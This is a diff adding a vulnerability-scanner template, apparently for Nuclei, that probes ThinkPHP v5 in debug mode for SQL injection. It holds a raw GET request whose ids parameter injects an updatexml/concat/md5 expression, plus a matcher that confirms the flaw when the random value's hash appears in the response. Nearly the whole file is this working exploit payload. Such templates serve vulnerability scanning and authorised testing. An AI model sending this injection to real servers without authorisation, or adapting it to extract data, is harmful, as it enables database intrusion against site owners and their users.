@@ -1,0 +1,32 @@
+id: poc-local-thinkphp-v5-debug-index-ids-sqli
+
+info:
+  name: poc-local-thinkphp-v5-debug-index-ids-sqli
+  author: capiton
+  severity: high
+  description: ""
+  reference: ""
+  tags: thinkphp
+
+variables:
+  randInt: "{{rand_int(10000,99999)}}"
+  md5_randInt: "{{md5(randInt)}}"
+
+requests:
+  - raw:
+      - |+
+        GET /index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5({{randInt}})),0)]=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+
+
+
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "{{md5_randInt}}"
+
